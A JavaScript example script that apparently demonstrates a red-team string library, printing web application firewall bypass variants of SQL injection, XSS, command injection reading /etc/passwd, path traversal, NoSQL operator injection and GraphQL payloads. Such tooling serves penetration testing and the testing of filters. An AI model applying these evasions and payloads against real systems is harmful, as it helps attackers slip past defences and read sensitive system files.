// WAF bypass examples using multiple transformations

const redstr = require('../index');

console.log('=== WAF Bypass Examples ===\n');

// Example 1: SQL injection with multiple evasion techniques
const sqlPayload = 'SELECT * FROM users';
console.log('Original SQL:', sqlPayload);
console.log('With comments:', redstr.sqlCommentInjection(sqlPayload));
console.log('Case variation:', redstr.randomizeCapitalization(sqlPayload));
console.log('URL encoded:', redstr.urlEncode(sqlPayload));
console.log('Mixed encoding:', redstr.mixedEncoding(sqlPayload));
console.log('');

// Example 2: XSS payload obfuscation
const xssPayload = '<script>alert(1)</script>';
console.log('Original XSS:', xssPayload);
console.log('Tag variations:', redstr.xssTagVariations('alert(1)'));
console.log('HTML entities:', redstr.htmlEntityEncode(xssPayload));
console.log('JS concat:', redstr.jsStringConcat('alert(1)'));
console.log('Unicode:', redstr.unicodeVariations(xssPayload));
console.log('');

// Example 3: Command injection with obfuscation
const cmdPayload = 'cat /etc/passwd';
console.log('Original command:', cmdPayload);
console.log('Command injection:', redstr.commandInjection(cmdPayload));
console.log('Bash obfuscate:', redstr.bashObfuscate(cmdPayload));
console.log('Path traversal:', redstr.pathTraversal('etc/passwd'));
console.log('Null byte:', redstr.nullByteInjection(cmdPayload));
console.log('');

// Example 4: Filter bypass with case and encoding
const filterTest = 'admin';
console.log('Original:', filterTest);
console.log('Leetspeak:', redstr.leetspeak(filterTest));
console.log('Case swap:', redstr.caseSwap(filterTest));
console.log('Alternate case:', redstr.alternateCase(filterTest));
console.log('Homoglyphs:', redstr.homoglyphSubstitution(filterTest));
console.log('Zalgo:', redstr.zalgoText(filterTest));
console.log('');

// Example 5: NoSQL injection patterns
const noSqlPayload = '{"$ne": null}';
console.log('Original NoSQL:', noSqlPayload);
console.log('MongoDB:', redstr.mongodbInjection(noSqlPayload));
console.log('NoSQL operators:', redstr.nosqlOperatorInjection(noSqlPayload));
console.log('');

// Example 6: GraphQL obfuscation
const graphqlQuery = 'query { users { id name } }';
console.log('Original GraphQL:', graphqlQuery);
console.log('Obfuscated:', redstr.graphqlObfuscate(graphqlQuery));
console.log('Variable injection:', redstr.graphqlVariableInjection(graphqlQuery));
console.log('');
